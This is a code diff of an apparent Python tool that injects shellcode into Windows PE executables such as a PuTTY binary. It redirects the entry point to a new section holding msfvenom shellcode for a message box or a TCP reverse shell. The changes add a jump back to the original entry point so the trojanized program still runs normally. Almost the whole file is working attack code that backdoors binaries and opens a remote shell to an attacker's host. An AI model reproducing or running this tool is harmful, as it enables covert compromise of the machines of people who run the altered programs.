@@ -1,13 +1,19 @@
 import pefile
 from config import VERBOSE
 import utilities
+import struct
 
 
-def msgbox():
+def msgbox(oep, base):
+
+    # TODO pe-bear, firefox
     # for this example we are using the message box payload
     # msfvenom -a x86 --platform windows -p windows/messagebox \
     # TEXT="Test, Test, I'm in your code :)" ICON=INFORMATION \
     # EXITFUNC=process TITLE="Testing" -f python
+    jumpback = base + oep  # \xF0\x50\x45\x00
+    jumpback = struct.pack('I', jumpback)
+    call = b'\xB8' + jumpback + b'\xFF\xD0'
 
     messagebox = bytes(b"\xd9\xeb\x9b\xd9\x74\x24\xf4\x31\xd2\xb2\x77\x31\xc9"
                        b"\x64\x8b\x71\x30\x8b\x76\x0c\x8b\x76\x1c\x8b\x46\x08"
@@ -30,13 +36,12 @@ def msgbox():
                        b"\x63\x68\x6e\x20\x79\x6f\x68\x27\x6d\x20\x69\x68\x73"
                        b"\x74\x20\x49\x68\x2c\x20\x54\x65\x68\x54\x65\x73\x74"
                        b"\x31\xc9\x88\x4c\x24\x1e\x89\xe1\x31\xd2\x6a\x40\x53"
-                       b"\x51\x52\xff\xd0\xB8\x96\xFE\x46\x00\xFF\xD0")
+                       b"\x51\x52\xff\xd0" + call)
 
-    # jumpback = pe.OPTIONAL_HEADER.BaseOfCode + oep
     return messagebox
 
 
-def reverse_shell(lhost=None):
+def reverse_shell(oep, base, lhost=None):
     # msfvenom -a x86 --platform windows -p windows/shell_reverse_tcp
     # LHOST=192.168.1.148 LPORT=8080 -f python
     if lhost is None:
@@ -44,6 +49,11 @@ def reverse_shell(lhost=None):
 
     ip = utilities.ip_to_hex(lhost)
 
+    jumpback = base + oep  # \xF0\x50\x45\x00
+    jumpback = struct.pack('I', jumpback)
+    call = b'\xB8' + jumpback + b'\xFF\xD0'
+
+    # jumpback = b'\xe8\x52\xed\xf5\xff\x90'
     shellcode = bytes(b"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b"
                       b"\x50\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7"
                       b"\x4a\x26\x31\xff\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf"
@@ -68,15 +78,15 @@ def reverse_shell(lhost=None):
                       b"\x79\xcc\x3f\x86\xff\xd5\x89\xe0\x90\x56\x46\xff\x30"
                       b"\x68\x08\x87\x1d\x60\xff\xd5\xbb\xf0\xb5\xa2\x56\x68"
                       b"\xa6\x95\xbd\x9d\xff\xd5\x3c\x06\x7c\x0a\x80\xfb\xe0"
-                      b"\x75\x05\xbb\x47\x13\x72\x6f\xe8\x52\xed\xf5\xff\x90")
+                      b"\x75\x05\xbb\x47\x13\x72\x6f" + call)
     return shellcode
 
 
-def payload_selection(payload, *args, **kwargs):
+def payload_selection(payload, oep, base, *args, **kwargs):
     if payload in 'msgbox':
         if VERBOSE:
             print("Selecting Message Box Shellcode\n")
-        return msgbox()
+        return msgbox(oep, base)
     elif payload in 'reverse':
         if VERBOSE:
             print("Selecting Windows TCP Reverse Shell Shellcode")
@@ -85,7 +95,7 @@ def payload_selection(payload, *args, **kwargs):
             for a in args:
                 print(f"\tAdditional Argument: {a}")
             print()
-        return reverse_shell(*args, **kwargs)
+        return reverse_shell(oep, base, *args, **kwargs)
 
 
 def insert_payload(path, payload, *args, **kwargs):
@@ -96,6 +106,7 @@ def insert_payload(path, payload, *args, **kwargs):
     # section this will run our injected code first
     if VERBOSE:
         print(f"Modifying Entry Point\n")
+    oep = pe.OPTIONAL_HEADER.AddressOfEntryPoint
     pe.OPTIONAL_HEADER.AddressOfEntryPoint = pe.sections[-1].VirtualAddress
 
     # Now we have to actually load the payload into the binary
@@ -103,7 +114,8 @@ def insert_payload(path, payload, *args, **kwargs):
     raw_offset = pe.sections[-1].PointerToRawData
 
     # Write the shellcode into the new section
-    shellcode = payload_selection(payload, *args, **kwargs)
+    shellcode = payload_selection(
+        payload, oep, pe.OPTIONAL_HEADER.ImageBase, *args, **kwargs)
 
     if VERBOSE:
         print(f"Writing shellcode to {hex(raw_offset)}\n")
@@ -113,6 +125,6 @@ def insert_payload(path, payload, *args, **kwargs):
 
 
 if __name__ == "__main__":
-    p = 'rev'
-    path = utilities.make_duplicate("./assets/bin/putty_injection.exe", p)
+    p = 'msg'
+    path = "./assets/bin/putty_injection.exe"
     insert_payload(path, p)
